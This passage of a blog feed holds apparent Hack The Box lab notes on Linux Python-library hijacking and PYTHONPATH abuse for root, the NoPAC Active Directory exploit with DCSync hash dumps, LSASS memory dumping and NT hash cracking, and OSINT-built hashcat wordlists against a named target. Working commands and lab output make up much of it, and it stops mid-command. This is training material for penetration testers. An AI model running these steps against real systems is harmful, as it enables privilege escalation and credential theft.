class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>we can see that <code>psutil</code> is installed in the following path: <code>/usr/local/lib/python3.8/dist-packages</code>. From our previous listing of the <code>PYTHONPATH</code> variable, we have a reasonable amount of directories to choose from to see if there might be any misconfigurations in the environment to allow us <code>write</code> access to any of them. Let us check.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> -la /usr/lib/python3.8</span></span><br><span class="line"></span><br><span class="line">total 4916</span><br><span class="line">drwxr-xrwx 30 root root  20480 Dec 14 16:26 .</span><br><span class="line">...SNIP...</span><br></pre></td></tr></table></figure><p>it appears that <code>/usr/lib/python3.8</code> path is misconfigured in a way to allow any user to write to it. Cross-checking with values from the <code>PYTHONPATH</code> variable, we can see that this path is higher on the list than the path in which <code>psutil</code> is installed in.<br>Now lets create our module that will get executed before the original and place it<br>under <code>/dist-packages</code>, we’ll have to name it <code>psutil.py</code> so python recognizes the name</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">virtual_memory</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;id&#x27;</span>)</span><br></pre></td></tr></table></figure><p>copy our fake module to dist-packages</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp psutil.py  /usr/local/lib/python3.8/dist-packages</span><br></pre></td></tr></table></figure><p>test</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo /usr/bin/python3 mem_status.py</span><br><span class="line">or $ sudo -u root /usr/bin/python3 /home/htb-student/mem_status.py</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><p>As we can see from the output, we have successfully gained execution as <code>root</code> through hijacking the module’s path via a misconfiguration in the permissions of the <code>/usr/lib/python3.8</code> directory.</p><hr><h2 id="PYTHONPATH-Environment-Variable"><a href="#PYTHONPATH-Environment-Variable" class="headerlink" title="PYTHONPATH Environment Variable"></a>PYTHONPATH Environment Variable</h2><p><code>PYTHONPATH</code> is an environment variable that indicates what directory (or directories) Python can search for modules to import. This is important as if a user is allowed to manipulate and set this variable while running the python binary, they can effectively redirect Python’s search functionality to a <code>user-defined</code> location when it comes time to import modules. We can see if we have the permissions to set environment variables for the python binary by checking our <code>sudo</code> permissions:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> -l</span> </span><br><span class="line"></span><br><span class="line">Matching Defaults entries for htb-student on ACADEMY-LPENIX:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User crytix may run the following commands on LPENIX:</span><br><span class="line">    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3</span><br></pre></td></tr></table></figure><p>As we can see from the example, we are allowed to run <code>/usr/bin/python3</code> under the trusted permissions of <code>sudo</code> and are therefore allowed to set environment variables for use with this binary by the <code>SETENV:</code> flag being set. It is important to note, that due to the trusted nature of <code>sudo</code>, any environment variables defined prior to calling the binary are not subject to any restrictions regarding being able to set environment variables on the system. This means that using the <code>/usr/bin/python3</code> binary, we can effectively set any environment variables under the context of our running program. Let’s try to do so now using the <code>psutil.py</code> script from the last section.        </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">crytix@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">...SNIP...</span><br></pre></td></tr></table></figure><p>In this example, we moved the previous python script from the <code>/usr/lib/python3.8</code> directory to <code>/tmp</code>. From here we once again call <code>/usr/bin/python3</code> to run <code>mem_stats.py</code>, however, we specify that the <code>PYTHONPATH</code> variable contain the <code>/tmp</code> directory so that it forces Python to search that directory looking for the <code>psutil</code> module to import. As we can see, we once again have successfully run our script under the context of root.</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python imports </tag>
            
            <tag> PrivEsc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>The NoPAC Attack</title>
      <link href="/2025/07/08/No-pac/"/>
      <url>/2025/07/08/No-pac/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/NOPACK.png" alt="alt text"></p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>NoPAC is a privilege escalation vulnerability in Active Directory environments that allows an authenticated low-privileged user to impersonate any user, including Domain Admins</p><h2 id="The-Inside-Out"><a href="#The-Inside-Out" class="headerlink" title="The Inside Out"></a>The Inside Out</h2><p>This vulnerability encompasses two CVEs 2021-42278 and 2021-42287, allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command. Here is a quick breakdown of what each CVE provides regarding this vulnerability.</p><table><thead><tr><th>CVE</th><th>Description</th></tr></thead><tbody><tr><td>42278</td><td>42278 is a bypass vulnerability with the Security Account Manager (SAM).</td></tr><tr><td>42287</td><td>42287 is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.</td></tr></tbody></table><p>This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain.</p><p>When doing so, we change the name of the new host to match a Domain Controller’s SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC’s name instead of the new name. </p><p>When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller. The flow of the attack is outlined in detail in this blog post.</p><p>In November 9, 2021: Microsoft released initial security updates that addressed both CVE‑2021‑42278 (SAM spoofing) and CVE‑2021‑42287 (Kerberos PAC bypass)<br><a href="https://support.microsoft.com/en-us/topic/kb5011266">support.microsoft.com+15</a></p><h3 id="Potential-precursor-to-ransomware-infections"><a href="#Potential-precursor-to-ransomware-infections" class="headerlink" title="Potential precursor to ransomware infections"></a>Potential precursor to ransomware infections</h3><p>After gaining domain access, a threat actor’s ability to deploy additional malware, including ransomware, is virtually unlimited. AD abuse is involved in most ransomware incidents Secureworks researchers investigate. Threat actors typically leverage misconfigurations to escalate privileges within AD. In this case, AD design flaws create the escalation path.</p><h1 id="Setup"><a href="#Setup" class="headerlink" title="Setup:"></a>Setup:</h1><h4 id="Ensuring-Impacket-is-Installed"><a href="#Ensuring-Impacket-is-Installed" class="headerlink" title="Ensuring Impacket is Installed"></a>Ensuring Impacket is Installed</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magdy3660@htb[/htb]$ git clone https://github.com/SecureAuthCorp/impacket.git</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magdy3660@htb[/htb]$ python setup.py install </span><br></pre></td></tr></table></figure><h4 id="Cloning-the-NoPac-Exploit-Repo"><a href="#Cloning-the-NoPac-Exploit-Repo" class="headerlink" title="Cloning the NoPac Exploit Repo"></a>Cloning the NoPac Exploit Repo</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magdy3660@htb[/htb]$ git clone https://github.com/Ridter/noPac.git</span><br></pre></td></tr></table></figure><p>Once Impacket is installed and we ensure the repo is cloned to our attack box, we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (<code>scanner.py</code>) then use the exploit (<code>noPac.py</code>) to gain a shell as <code>NT AUTHORITY/SYSTEM</code>. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable. We’ll also notice the <code>ms-DS-MachineAccountQuota</code> number is set to 10. In some environments, an astute sysadmin may set the <code>ms-DS-MachineAccountQuota</code> value to 0. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to <code>0</code> can prevent quite </p><hr><h4 id="Running-NoPac"><a href="#Running-NoPac" class="headerlink" title="Running NoPac"></a>Running NoPac</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</span><br></pre></td></tr></table></figure><p>We will notice that a <code>semi-interactive shell session</code> is established with the target using <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py">smbexec.py</a>. Keep in mind with smbexec shells we will need to use exact paths instead of navigating the directory structure using <code>cd</code>.</p><p>It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use <code>ls</code> to confirm.</p><h4 id="Confirming-the-Location-of-Saved-Tickets"><a href="#Confirming-the-Location-of-Saved-Tickets" class="headerlink" title="Confirming the Location of Saved Tickets"></a>Confirming the Location of Saved Tickets</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line"></span><br><span class="line">administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils</span><br><span class="line">README.md  scanner.py</span><br></pre></td></tr></table></figure><p>We could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync. We can also use the tool with the <code>-dump</code> flag to perform a DCSync using secretsdump.py. This method would still create a ccache file on disk, which we would want to be aware of and clean up.</p><p> <code>Using noPac to DCSync the Built-in Administrator Account</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</span><br><span class="line"></span><br><span class="line">                                                                    </span><br><span class="line">[*] Current ms-DS-MachineAccountQuota = 10</span><br><span class="line">[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] will try to impersonat administrator</span><br><span class="line">[*] Alreay have user administrator ticket for target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Pls make sure your choice hostname and the -dc-ip are same machine !!</span><br><span class="line">[*] Exploiting..</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6</span><br><span class="line">inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25</span><br><span class="line">inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> nopac </tag>
            
            <tag> AD </tag>
            
            <tag> Active Directory </tag>
            
            <tag> Lateral Movement </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Attacking Windows LSASS</title>
      <link href="/2025/07/08/Attacking%20lsass/"/>
      <url>/2025/07/08/Attacking%20lsass/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/mimikatz1.png" alt="alt text"></p><hr><h1 id="Overview"><a href="#Overview" class="headerlink" title="_Overview"></a>_Overview</h1><p>In addition to acquiring copies of the SAM database to extract and crack password hashes, we will also benefit from targeting the <a href="https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service">Local Security Authority Subsystem Service (LSASS)</a>.</p><p>Upon initial logon, LSASS will:</p><ul><li>Cache credentials locally in memory</li><li>Create <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens">access tokens</a></li><li>Enforce security policies</li><li>Write to Windows’ <a href="https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security">security log</a><br>Let’s cover some of the techniques and tools we can use to dump LSASS memory and extract credentials from a target running Windows.</li></ul><h2 id="Securable-Objects"><a href="#Securable-Objects" class="headerlink" title="Securable Objects"></a>Securable Objects</h2><p>In Windows, <strong>securable objects</strong> are resources that the operating system protects through <strong>Access Control Lists (ACLs)</strong> and other security mechanisms. These objects can have permissions assigned to users or groups, allowing or denying access.</p><h2 id="LSASS-Process-Memory-dump"><a href="#LSASS-Process-Memory-dump" class="headerlink" title="LSASS Process Memory dump"></a>LSASS Process Memory dump</h2><p>Similar to the process of attacking the SAM database, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. K</p><h3 id="Through-task-manager"><a href="#Through-task-manager" class="headerlink" title="Through task manager"></a>Through task manager</h3><ol><li>Open <code>Task Manager</code></li><li>Select the <code>Processes</code> tab</li><li>Find and right click the <code>Local Security Authority Process</code></li><li>Select <code>Create dump file</code><br><img src="/../images/lasas.png" alt="alt text"><br>A file called <code>lsass.DMP</code> is created and saved in <code>%temp%</code>. This is the file we will transfer to our attack host.<br><img src="/%22/images/lsassexe_diagram.webp%22" alt="alt text"></li></ol><h1 id="Through-rundll32"><a href="#Through-rundll32" class="headerlink" title="Through rundll32"></a>Through rundll32</h1><p>This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line. It is important to note that modern anti-virus tools recognize this method as malicious activity.</p><p>Before issuing the command to create the dump file, we must determine what process ID (<code>PID</code>) is assigned to <code>lsass.exe</code>. This can be done from cmd or PowerShell:</p><p>Finding LSASS’s PID in cmd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; tasklist /svc</span><br></pre></td></tr></table></figure><p>Finding LSASS’s PID in  powershell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">system32&gt; Get-Process lsass</span><br><span class="line"></span><br><span class="line">ID</span><br><span class="line">672</span><br></pre></td></tr></table></figure><p>Creating a dump file using PowerShell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system32&gt; rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full</span><br></pre></td></tr></table></figure><p>that most modern AV tools recognize this as malicious activity and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing</p><p>With this command, we are running <code>rundll32.exe</code> to call an exported function of <code>comsvcs.dll</code> which also calls the MiniDumpWriteDump (<code>MiniDump</code>) function to dump the LSASS process memory to a specified directory (<code>C:\lsass.dmp</code>).</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extract hashes</span><br><span class="line">$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp </span><br></pre></td></tr></table></figure><h1 id="LSA-Inners-dumped-content"><a href="#LSA-Inners-dumped-content" class="headerlink" title="LSA Inners (dumped content)"></a>LSA Inners (dumped content)</h1><h4 id="MSV"><a href="#MSV" class="headerlink" title="MSV"></a>MSV</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sid S-1-5-21-4019466498-1700476312-3544718034-1001</span><br><span class="line">luid 1354633</span><br><span class="line">== MSV ==</span><br><span class="line">Username: bob</span><br><span class="line">Domain: DESKTOP-33E7O54</span><br><span class="line">LM: NA</span><br><span class="line">NT: 64f12cddaa88057e06a81b54e73b949b</span><br><span class="line">SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8</span><br><span class="line">DPAPI: NA</span><br></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package">MSV</a> is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. </p><h4 id="WDIGEST"><a href="#WDIGEST" class="headerlink" title="WDIGEST"></a>WDIGEST</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">== WDIGEST [14ab89]==</span><br><span class="line">username bob</span><br><span class="line">domainname DESKTOP-33E7O54</span><br><span class="line">password None</span><br><span class="line">password (hex)</span><br></pre></td></tr></table></figure><p><code>WDIGEST</code> is an older authentication protocol enabled by default in <code>Windows XP</code> - <code>Windows 8</code> and <code>Windows Server 2003</code> - <code>Windows Server 2012</code>. LSASS caches credentials used by WDIGEST in clear-text.</p><h4 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">== Kerberos ==</span><br><span class="line">Username: bob</span><br><span class="line">Domain: DESKTOP-33E7O54</span><br></pre></td></tr></table></figure><p><a href="https://web.mit.edu/kerberos/#what_is">Kerberos</a> is a network authentication protocol used by Active Directory in Windows Domain environments.<br>Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time.<br>LSASS caches <code>passwords</code>, <code>ekeys</code>, <code>tickets</code>, and <code>pins</code> associated with Kerberos</p><h4 id="DPAPI"><a href="#DPAPI" class="headerlink" title="DPAPI"></a>DPAPI</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">== DPAPI [14ab89]==</span><br><span class="line">luid 1354633</span><br><span class="line">key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b</span><br><span class="line">masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92</span><br><span class="line">sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605</span><br></pre></td></tr></table></figure><p>Mimikatz and Pypykatz can extract the DPAPI <code>masterkey</code> for logged-on users whose data is present in LSASS process memory. These masterkeys can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts. covered in privEsc</p><h1 id="crack-nt-hash"><a href="#crack-nt-hash" class="headerlink" title="crack nt hash"></a>crack nt hash</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> lsass </tag>
            
            <tag> secretsdump </tag>
            
            <tag> mimikatz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Writing custom wordlists using hashcat and cuppy</title>
      <link href="/2025/06/20/HTB-Writing%20custom%20wordlists%20using%20hashcat%20and%20cuppy/"/>
      <url>/2025/06/20/HTB-Writing%20custom%20wordlists%20using%20hashcat%20and%20cuppy/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/hashcat1.png" alt="alt text"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>this section highlights the power of custom wordlists,<br>Instead of relying on generic, multi-gigabyte wordlists, we will perform a <strong>targeted attack</strong>.</p><p>This highly effective strategy uses Open Source Intelligence (OSINT) to create a custom wordlist and ruleset tailored specifically to our victim.</p><p>We can use Hashcat to combine lists of potential names and labels with specific mutation rules to create custom wordlists.</p><p>Hashcat uses a specific syntax to define characters, words, and their transformations. The complete syntax is documented in the official <a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack">Hashcat rule-based attack documentation</a>, but the examples below are sufficient to understand how Hashcat mutates input words.</p><table><thead><tr><th><strong>Function</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>:</code></td><td>Do nothing</td></tr><tr><td><code>l</code></td><td>Lowercase all letters</td></tr><tr><td><code>u</code></td><td>Uppercase all letters</td></tr><tr><td><code>c</code></td><td>Capitalize the first letter and lowercase others</td></tr><tr><td><code>sXY</code> (leet)</td><td>Replace all instances of X with Y</td></tr><tr><td><code>$!</code></td><td>Add the exclamation character at the end</td></tr><tr><td>$0, $9</td><td>appends numbers</td></tr><tr><td>$1$9$9$8</td><td>translates to 1998</td></tr><tr><td><code>t</code></td><td>Toggle the case of all characters in word p@ssW0rd-&gt;P@SSw0RD</td></tr></tbody></table><p>Each rule is written on a new line and determines how a given word should be transformed. If we write the functions shown above into a file, it may look like this:</p><p>We can use the following command to apply the rules in <code>custom.rule</code> to each word in <code>password.list</code> and store the mutated results in <code>mut_password.list</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magdy3660@htb[/htb]$ hashcat --force password.list -r custom.rule --stdout | sort -u &gt; mut_password.list</span><br></pre></td></tr></table></figure><p>password cracking and the creation of custom wordlists are, in most cases, a guessing game. We can narrow this down and perform more targeted guessing if we have information about the password policy, while considering factors such as the company name, geographical region, industry, and other topics or keywords that users might choose when creating their passwords. Exceptions, of course, include cases where passwords have been leaked and directly obtained.</p><h2 id="Generating-wordlists-using-CeWL"><a href="#Generating-wordlists-using-CeWL" class="headerlink" title="Generating wordlists using CeWL"></a>Generating wordlists using CeWL</h2><p>We can use a tool called <a href="https://github.com/digininja/CeWL">CeWL</a> to scan potential words from a company’s website and save them in a separate list. We can then combine this list with the desired rules to create a customized password list—one that has a higher probability of containing the correct password for an employee. We specify some parameters, like the depth to spider (<code>-d</code>), the minimum length of the word (<code>-m</code>), the storage of the found words in lowercase (<code>--lowercase</code>), as well as the file where we want to store the results (<code>-w</code>).</p><p>Writing Custom Wordlists and Rules</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist</span><br><span class="line">magdy3660@htb[/htb]$ wc -l inlane.wordlist</span><br><span class="line"></span><br><span class="line">326</span><br></pre></td></tr></table></figure><p>Welcome to this hands-on lab where we’ll crack a password hash by building a targeted wordlist. Instead of relying on generic, multi-gigabyte wordlists, we will perform a <strong>targeted attack</strong>. This highly effective strategy uses Open Source Intelligence (OSINT) to create a custom wordlist and ruleset tailored specifically to our victim.</p><p>This exercise will show you how to combine intelligence gathering with the power of <code>cuppy</code> and <code>hashcat</code> to compromise a password under a corporate policy.</p><h1 id="SECTION-EXERCISE"><a href="#SECTION-EXERCISE" class="headerlink" title="SECTION EXERCISE"></a>SECTION EXERCISE</h1><h3 id="The-Scenario"><a href="#The-Scenario" class="headerlink" title="The Scenario"></a>The Scenario</h3><p>Imagine we have compromised a password hash from the work email of a target named <strong>Mark White</strong>. Through some basic OSINT, we’ve gathered the following details:</p><ul><li><strong>Name:</strong> Mark White</li><li><strong>Birth Date:</strong> August 5, 1998</li><li><strong>Employer:</strong> Nexura, Ltd.</li><li><strong>Company Password Policy:</strong><ul><li>Minimum 12 characters</li><li>At least one uppercase letter</li><li>At least one lowercase letter</li><li>At least one number</li><li>At least one symbol</li></ul></li><li><strong>Location:</strong> San Francisco, CA, USA</li><li><strong>Personal Details:</strong><ul><li>Wife: <code>Maria</code></li><li>Son: <code>Alex</code></li><li>Pet Cat: <code>Bella</code></li><li>Hobby: <code>baseball</code></li></ul></li></ul><p><strong>The Target Hash (MD5):</strong> <code>97268a8ae45ac7d15c3cea4ce6ea550b</code></p><h1 id="Generating-a-Base-Wordlist-with-cuppy"><a href="#Generating-a-Base-Wordlist-with-cuppy" class="headerlink" title="Generating a Base Wordlist with cuppy"></a>Generating a Base Wordlist with <code>cuppy</code></h1><p>first we need to convert our OSINT data into a list of potential password keywords. The <strong>Common User Passwords Profiler (<code>cuppy</code>)</strong> is the perfect tool for this job. It takes personal information as input and generates a wordlist based on common patterns.</p><p>Run <code>cuppy</code> in interactive mode and enter the information we gathered about Mark.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cuppy -i </span><br><span class="line"># When prompted, enter the details and save the file as mark.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ wc -l mark.txt </span><br><span class="line">16797 mark.txt</span><br></pre></td></tr></table></figure><h1 id="Creating-hashcat-rules"><a href="#Creating-hashcat-rules" class="headerlink" title="Creating hashcat rules"></a>Creating hashcat rules</h1><p>We’ll create a file named <code>custom.rule</code> to add the required complexity (capitalization, numbers, symbols).</p><p>Instead of only guessing the most obvious pattern, we’ll create a broader set of rules. This will generate a very large number of candidates, increasing our chances of success if the user chose a slightly less common pattern.</p><p>Here is an example of a more comprehensive <code>custom.rule</code> file. It includes capitalization, leetspeak substitutions (<code>s</code> for <code>$</code>, <code>a</code> for <code>@</code>), and appending various years and symbols.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># custom.rule - A broad ruleset for our target</span><br><span class="line"></span><br><span class="line"># --- SECTION 1: Simple capitalization and appending year/symbol ---</span><br><span class="line"># Creates passwords like: Baseball1998!</span><br><span class="line">c $1$9$9$8$!</span><br><span class="line">c $1$9$9$8$#</span><br><span class="line">c $1$9$9$8$@</span><br><span class="line"></span><br><span class="line"># --- SECTION 2: Toggle case and add years/symbols ---</span><br><span class="line"># Creates passwords like: bASEBALL1998!</span><br><span class="line">t $1$9$9$8$!</span><br><span class="line">t $1$9$9$8$#</span><br><span class="line"></span><br><span class="line"># --- SECTION 3: Leetspeak (Character Substitution) ---</span><br><span class="line"># Creates passwords like: M@ri@1998!, B@seb@ll2025#</span><br><span class="line">c sa@ $1$9$9$8$!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># --- SECTION 4: Combined leetspeak ---</span><br><span class="line"># Creates passwords like: B@$eb@ll98!</span><br><span class="line">c sa@ ss$ $9$8$!</span><br></pre></td></tr></table></figure><p><em>Note: Your own rule file might be much larger to generate all the possibilities.</em></p><h3 id="Applying-Rules-and-Filtering-the-Wordlist"><a href="#Applying-Rules-and-Filtering-the-Wordlist" class="headerlink" title="Applying Rules and Filtering the Wordlist"></a>Applying Rules and Filtering the Wordlist</h3><p>Now, let’s apply our <code>custom.rule</code> file to the <code>mark.txt</code> wordlist. We’ll use <code>hashcat</code> with the <code>--stdout</code> flag to output all the generated password candidates and save them to a new file. The <code>sort -u</code> command removes any duplicates.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat --force mark.txt -r custom.rule --stdout | sort -u &gt; mut_password.list</span><br></pre></td></tr></table></figure><p>This process will create a huge list of mutated passwords. Let’s see the result.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat mut_password.list | grep -E &#x27;^.&#123;12,&#125;$&#x27; | grep -E 